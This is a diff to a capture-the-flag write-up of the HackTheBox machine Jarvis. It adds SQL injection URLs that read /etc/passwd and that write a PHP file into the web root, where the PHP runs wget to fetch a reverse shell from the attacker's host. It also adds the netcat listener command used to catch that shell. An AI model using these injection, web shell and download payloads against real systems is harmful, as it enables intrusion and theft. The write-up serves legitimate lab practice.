@@ -320,6 +320,9 @@ select '<?php exec("wget -O /var/www/html/revshell.php http://10.10.14.8/revshel
 + Try to view **/etc/passwd** file: 
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,load_file("/etc/passwd"),6,7+FROM+mysql.user;-- -
+
+# Alternatively:
+http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,load_file(%22/etc/passwd%22),6,7
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/10307fd8-cc78-4bf9-a87c-b7e43597a4f0)
@@ -344,6 +347,24 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,'<?php echo system($_RE
 + See the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/367f423b-2b23-49fc-92be-58cda063afd0)
+
++ **Alternatively**, add php code that downloads the reverse shell script from the attack machine, and saves it in a file on the target system. Afterwards save the output of the query into a PHP file using the mysql INTO OUTFILE statement.
+```
+http://10.10.10.143/room.php?cod=55+union+select 1,2,3,4,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.8:8000/shell.php\");?>'),6,7 INTO OUTFILE '/var/www/html/shell.php'
+```
+
++ What the above query does, is it saves the entire query (including the PHP code) into the file **/var/www/html/shell.php**. This is the root directory of the web server. So when we call the **shell.php** script, it will execute the php code that we include in our select statement and download the reverse shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f5d82527-729e-4332-8c31-d2a905fc8a71)
+
++ Start a netcat listener on the attack machine: `nc -lnvp 4444`
++ Visit the `http://10.10.10.143/shell.php` twice or, refresh the page after first access.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3678a949-7c96-41a2-8001-0134069c2b8a)
+
++ Get the low level shell as **web daemon user (www-data)**, and do [shell upgrade](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#shell-upgrade).
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8ad858d9-780f-4308-9d5b-d685a1a59ddc)
 
 
 
